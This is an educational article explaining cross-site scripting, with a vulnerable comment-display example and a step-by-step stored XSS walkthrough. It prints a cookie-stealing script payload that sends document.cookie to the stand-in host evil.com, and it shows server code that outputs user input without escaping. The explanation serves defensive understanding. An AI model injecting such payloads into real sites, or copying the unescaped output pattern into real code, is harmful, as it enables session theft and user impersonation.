# What is Cross-site scripting (XSS) 

Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy. 

Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site.

# How Cross-site Scripting works

In order to run malicious JavaScript code in a victim’s browser, an attacker must first find a way to inject a payload into a web page that the victim visits. Of course, an attacker could use social engineering techniques to convince a user to visit a vulnerable page with an injected JavaScript payload.

In order for an XSS attack to take place the vulnerable website needs to directly include user input in its pages. An attacker can then insert a string that will be used within the web page and treated as code by the victim’s browser.

The following server-side pseudo-code is used to display the most recent comment on a web page.

```python
print "<html>"
print "<h1>Most recent comment</h1>"
print database.latestComment
print "</html>"
```

The above script is simply printing out the latest comment from a comments database and printing the contents out to an HTML page, assuming that the comment printed out only consists of text.

The above page is vulnerable to XSS because an attacker could submit a comment that contains a malicious payload such as <script>doSomethingEvil();</script>.

Users visiting the web page will get served the following HTML page.

```html
<html>
<h1>Most recent comment</h1>
<script>doSomethingEvil();</script>
</html>
```

When the page loads in the victim’s browser, the attacker’s malicious script will execute, most often without the user realizing or being able to prevent such an attack.

> Important Note — An XSS vulnerability can only exist if the payload (malicious script) that the attacker inserts ultimately get parsed (as HTML in this case) in the victim’s browser.

### What’s the worst an attacker can do with JavaScript?

The consequences of what an attacker can do with the ability to execute JavaScript on a web page may not immediately stand out, especially since browsers run JavaScript in a very tightly controlled environment and that JavaScript has limited access to the user’s operating system and the user’s files.

However, when considering that JavaScript has access to the following, it’s easier to understand how creative attackers can get with JavaScript.

* Malicious JavaScript has access to all the same objects the rest of the web page has, including access to cookies. Cookies are often used to store session tokens, if an attacker can obtain a user’s session cookie, they can impersonate that user.
* JavaScript can read and make arbitrary modifications to the browser’s DOM (within the page that JavaScript is running).
* JavaScript can use XMLHttpRequest to send HTTP requests with arbitrary content to arbitrary destinations.
* JavaScript in modern browsers can leverage HTML5 APIs such as accessing a user’s geolocation, webcam, microphone and even the specific files from the user’s file system. While most of these APIs require user opt-in, XSS in conjunction with some clever social engineering can bring an attacker a long way.

The above, in combination with social engineering, allow attackers to pull off advanced attacks including cookie theft, keylogging, phishing and identity theft. Critically, XSS vulnerabilities provide the perfect ground for attackers to escalate attacks to more serious ones.

### The anatomy of a Cross-site Scripting attack

An XSS attack needs three actors — the website, the victim and the attacker.

In the example below, it shall be assumed that the attacker’s goal is to impersonate the victim by stealing the victim’s cookie. Sending the cookie to a server the attacker controls can be achieved in a variety of ways, one of which is for the attacker to execute the following JavaScript code in the victim’s browser through an XSS vulnerability.

```html
<script>
   window.location=“http://evil.com/?cookie=” + document.cookie
</script>
```

The figure below illustrates a step-by-step walkthrough of a simple XSS attack.  

<img src="https://d3eaqdewfg2crq.cloudfront.net/wp-content/uploads/2012/10/how-xss-works-1024x454.png">

1. The attacker injects a payload in the website’s database by submitting a vulnerable form with some malicious JavaScript
2. The victim requests the web page from the website
3. The website serves the victim’s browser the page with the attacker’s payload as part of the HTML body.
4. The victim’s browser will execute the malicious script inside the HTML body. In this case it would send the victim’s cookie to the attacker’s server. The attacker now simply needs to extract the victim’s cookie when the HTTP request arrives to the server, after which the attacker can use the victim’s stolen cookie for impersonation.



